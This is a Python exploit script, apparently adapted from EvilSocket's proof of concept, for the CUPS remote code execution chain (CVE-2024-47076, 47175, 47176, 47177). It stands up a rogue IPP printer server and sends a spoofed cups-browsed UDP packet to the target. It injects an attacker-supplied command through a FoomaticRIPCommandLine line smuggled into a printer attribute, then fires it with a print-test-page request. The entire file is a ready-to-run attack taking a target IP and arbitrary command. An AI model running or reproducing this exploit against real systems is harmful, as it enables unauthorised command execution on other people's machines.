#!/usr/bin/env python3
# Based off of EvilSocket's Proof-of-Concept Exploit Script

import socket
import threading
import time
import sys
import argparse
import random
import string
import requests

from ippserver.server import IPPServer
import ippserver.behaviour as behaviour
from ippserver.server import IPPRequestHandler
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest

class ServerContext:
    def __init__(self, server):
        self.server = server
        self.server_thread = None

    def __enter__(self):
        print(f'IPP Server Listening on {server.server_address}')
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()

    def __exit__(self, exc_type, exc_value, traceback):
        print('Shutting down the server...')
        self.server.shutdown()
        self.server_thread.join()

def handle_signal(signum, frame):
    raise KeyboardInterrupt()

class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [b'Main Printer'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Main Printer Info'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [b'HP 0.00'],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()],  # XXX 3 is idle
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1'],
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,  # (required by cups)
                    OperationEnum.validate_job,  # (required by cups)
                    OperationEnum.cancel_job,  # (required by cups)
                    OperationEnum.get_job_attributes,  # (required by cups)
                    OperationEnum.get_printer_attributes,
                )],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [Integer(666).bytes()],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-privacy-policy-uri',
                TagEnum.uri
            ): [b'https//www.google.com/"\n*FoomaticRIPCommandLine: "' + self.command.encode() + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],

        }
        attr.update(super().minimal_attributes())
        return attr

    def operation_printer_list_response(self, req, _psfile):
        print("\ntarget connected, sending payload ...")
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes)


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port, printer_name):
    print(f"Sending udp packet to {ip}:{port}...")
    printer_type = 2
    printer_state = '3'
    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
    printer_location = '"You Have Been Hacked!!"'
    printer_info = f'"{printer_name}"'
    printer_model = '"HP LaserJet 1020"'
    packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet.encode('utf-8'), (ip, port))

def run_server(server):
    with ServerContext(server):
        try:
            while True:
                time.sleep(.5)
        except KeyboardInterrupt:
            pass
    
    server.shutdown()


def generate_printer_name(min_length=4, max_length=8):
    # Generate a random alphanumeric printer name 
    length = random.randint(min_length, max_length)  
    random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    printer_name = f"printer{random_part}"

    # Print the generated printer name to the terminal
    print(f"Generated printer name: {printer_name}")
    return printer_name


def transform_ip(ip_address):
    # Replace dots with underscores
    transformed_ip = ip_address.replace('.', '_')
    return transformed_ip

def exploit_cups(target_host_ip, printer_name, transformed_ip):
    # Construct the endpoint URL
    url = f"http://{target_host_ip}:631/printers/{printer_name}_{transformed_ip}"
    
    try:
        # Make the GET request to the endpoint
        response = requests.get(url)
        sid_cookie_value = response.cookies.get('org.cups.sid')

        # Define the data to be sent in the POST request body
        trigger_data = {
            'org.cups.sid': sid_cookie_value,
            'OP': 'print-test-page'
        }

        trigger_cookie = {
            'org.cups.sid': sid_cookie_value
        }
        
        # Check if the response contains the string "printer_uri_supported"
        if "printer_uri_supported" in response.text:
            print(f"\nTarget host is not vulnerable. Malicious printer {printer_name} was not installed. Exiting..")
            return True  # Return True to indicate the target is not vulnerable and stop the timer
        else:
            # If the pattern is not found, run another function
            print(f"\nTarget host is vulnerable. Malicious printer {printer_name} installed. Attempting to trigger command injected..")
            # Send the POST request with the data
            trigger_response = requests.post(url, data=trigger_data, cookies=trigger_cookie)
            if "Test page sent" in trigger_response.text:
                print(f"Injected command on {printer_name} triggered via Print Test Page operation!")
                return False  # Return False to continue the timer
            else:
                print(f"Unable to trigger injected command on {printer_name} via Print Test Page operation!")
                return True
    
    except requests.RequestException as e:
        print(f"Error making request: {e}")
        return False


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Modified exploit script from EvilSocket's PoC for series of CUPS (Common Unix Printing System) vulnerability (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, and CVE-2024-47177)")
  
    parser.add_argument("-l", "--local", required=True, help="Specify the IP address to host malicious IPP server")
    parser.add_argument("-t", "--target", required=True, help="Specify the vulnerable CUPS target server's IP address")
    parser.add_argument("-c", "--command", required=True, help="Command to execute")
    parser.add_argument("-p", "--printer", help="Specify the custom printer name to install (OPTIONAL), automatically generate random printer name if not specified")
    args = parser.parse_args()

    ippsrv_host = args.local
    ippsrv_port = 12345
    command = args.command
    
    server = IPPServer((ippsrv_host, ippsrv_port),
                       IPPRequestHandler, MaliciousPrinter(command))

    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    target_host = args.target
    target_port = 631
    printer_name = args.printer if args.printer else generate_printer_name()
    send_browsed_packet(target_host, target_port, ippsrv_host, ippsrv_port, printer_name)

    print("Please wait this normally takes 30 seconds...")

    seconds = 0
    while True:
        time.sleep(1)

        # Run the function when 30 seconds have passed
        if seconds == 30:
            transformed_ip = transform_ip(ippsrv_host)
            if exploit_cups(target_host, printer_name,transformed_ip):
                sys.exit()
        seconds += 1
